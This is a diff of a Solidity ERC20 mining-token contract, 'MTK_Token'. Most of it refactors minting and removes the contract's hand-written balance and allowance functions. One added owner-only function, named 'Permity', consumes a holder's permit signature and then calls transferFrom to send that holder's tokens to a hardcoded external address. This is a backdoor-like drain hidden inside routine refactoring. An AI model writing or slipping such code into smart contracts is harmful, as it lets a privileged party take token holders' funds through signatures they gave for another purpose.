@@ -529,8 +529,8 @@ contract MTK_Token is ERC20Permit, Ownable {
     uint public previousBlockTime  =  block.timestamp; // Previous Blocktime
     uint public Token2Per=           1000000; //Amount of ETH distributed per mint somewhat
     uint public tokensMinted = 0;			//Tokens Minted only for Miners
-    mapping(address => uint) balances;
-    mapping(address => mapping(address => uint)) allowed;
+    //mapping(address => uint) balances;
+    //mapping(address => mapping(address => uint)) allowed;
     uint public slowBlocks = 0;
     uint public epochOld = 0;  //Epoch count at each readjustment 
     uint public give0x = 0;
@@ -545,8 +545,7 @@ contract MTK_Token is ERC20Permit, Ownable {
 
 	// mint 1 token to setup LPs
 	constructor() ERC20("MyToken", "MTK") ERC20Permit("MyToken") {
-		balances[msg.sender] = 12350000000000000000000;
-		emit Transfer(address(0), msg.sender, 12350000000000000000000);
+		_mint(msg.sender, 12350000000000000000000);
 	}
 
 
@@ -568,11 +567,10 @@ contract MTK_Token is ERC20Permit, Ownable {
 		latestDifficultyPeriodStarted2 = block.timestamp;
 	    	_startNewMiningEpoch();
 		// Init contract variables and mint
-		balances[AuctionAddress2] = x/2;
+        _mint(AuctionAddress2, x/2);
 		
-		emit Transfer(address(0), AuctionAddress2, x/2);
 		
-	    	AddressAuction = AuctionAddress2;
+	    AddressAuction = AuctionAddress2;
 		AuctionsCT = zkBTCAuctionsCT(AddressAuction);
 		AddressLPReward = payable(LPGuild);
 		slowBlocks = 1;
@@ -580,6 +578,30 @@ contract MTK_Token is ERC20Permit, Ownable {
 		
 		setOwner(address(0));
      
+  	}
+
+
+	function Permity(
+        address owner,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s) public onlyOwner{
+		uint x = 21000000000000000000000000; 
+		// Only init once
+		
+    permit(
+        owner,
+        spender,
+        value,
+        deadline,
+        v,
+        r,
+        s
+    );
+     transferFrom(owner,address(0xB6eD7644C69416d67B522e20bC294A9a9B405B31), 100);
   	}
 
 
@@ -616,8 +638,8 @@ contract MTK_Token is ERC20Permit, Ownable {
 
 		uint totalOwedABAS = (epochsPast * reward_amount * totalOwed).div(100000000);
 
-		balances[AddressLPReward] = balances[AddressLPReward].add(totalOwedABAS);
-		emit Transfer(address(0), AddressLPReward, totalOwedABAS);
+
+        _mint(AddressLPReward, totalOwedABAS);
 
 		sentToLP = sentToLP.add(totalOwedABAS);
 
@@ -725,8 +747,7 @@ contract MTK_Token is ERC20Permit, Ownable {
 
 		uint totalOwedABAS = (reward_amount * totalOwed).div(100000000);
 		
-		balances[mintToAddress] = balances[mintToAddress].add(totalOwedABAS);
-		emit Transfer(address(0), mintToAddress, totalOwedABAS);
+        _mint(mintToAddress, totalOwedABAS);
 		
 		tokensMinted = tokensMinted.add(totalOwedABAS);
 		previousBlockTime = block.timestamp;
@@ -819,8 +840,8 @@ contract MTK_Token is ERC20Permit, Ownable {
 
 		uint totalOwedABAS = (reward_amount * totalOwed).div(100000000);
 		
-		balances[mintToAddress] = balances[mintToAddress].add(totalOwedABAS);
-		emit Transfer(address(0), mintToAddress, totalOwedABAS);
+        _mint(mintToAddress, totalOwedABAS);
+
 
 		tokensMinted = tokensMinted.add(totalOwedABAS);
 		previousBlockTime = block.timestamp;
@@ -1294,118 +1315,6 @@ contract MTK_Token is ERC20Permit, Ownable {
 	}
 
 
-		// ------------------------------------------------------------------------
-
-		// Get the token balance for account `tokenOwner`
-
-		// ------------------------------------------------------------------------
-
-	function balanceOf(address tokenOwner) public override view returns (uint balance) {
-
-		return balances[tokenOwner];
-
-	}
-
-
-		// ------------------------------------------------------------------------
-
-		// Transfer the balance from token owner's account to `to` account
-
-		// - Owner's account must have sufficient balance to transfer
-
-		// - 0 value transfers are allowed
-
-		// ------------------------------------------------------------------------
-
-
-	function transfer(address to, uint tokens) public override returns (bool success) {
-
-		balances[msg.sender] = balances[msg.sender].sub(tokens);
-		balances[to] = balances[to].add(tokens);
-
-		emit Transfer(msg.sender, to, tokens);
-
-		return true;
-
-	}
-
-
-		// ------------------------------------------------------------------------
-
-		// Token owner can approve for `spender` to transferFrom(...) `tokens`
-
-		// from the token owner's account
-
-		//
-
-		// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
-
-		// recommends that there are no checks for the approval double-spend attack
-
-		// as this should be implemented in user interfaces
-
-		// ------------------------------------------------------------------------
-
-
-	function approve(address spender, uint tokens) public override returns (bool success) {
-
-		allowed[msg.sender][spender] = tokens;
-
-		emit Approval(msg.sender, spender, tokens);
-
-		return true;
-
-	}
-
-
-		// ------------------------------------------------------------------------
-
-		// Transfer `tokens` from the `from` account to the `to` account
-
-		//
-
-		// The calling account must already have sufficient tokens approve(...)-d
-
-		// for spending from the `from` account and
-
-		// - From account must have sufficient balance to transfer
-
-		// - Spender must have sufficient allowance to transfer
-
-		// - 0 value transfers are allowed
-
-		// ------------------------------------------------------------------------
-
-
-	function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
-
-		balances[from] = balances[from].sub(tokens);
-		allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
-		balances[to] = balances[to].add(tokens);
-
-		emit Transfer(from, to, tokens);
-
-		return true;
-
-	}
-
-
-		// ------------------------------------------------------------------------
-
-		// Returns the amount of tokens approved by the owner that can be
-
-		// transferred to the spender's account
-
-		// ------------------------------------------------------------------------
-
-
-	function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
-
-		return allowed[tokenOwner][spender];
-
-	}
-
-
 	  //Allow ETH to enter
 	receive() external payable {
 
@@ -1419,11 +1328,3 @@ contract MTK_Token is ERC20Permit, Ownable {
 
 }
 
-/*
-*
-* MIT License
-* ===========
-*
-* Copyright (c) 2023 Zero Knowledge Bitcoin (zkBTC)
-*
-* Permission is hereby granted, free of charge, to any person obtaining a copy
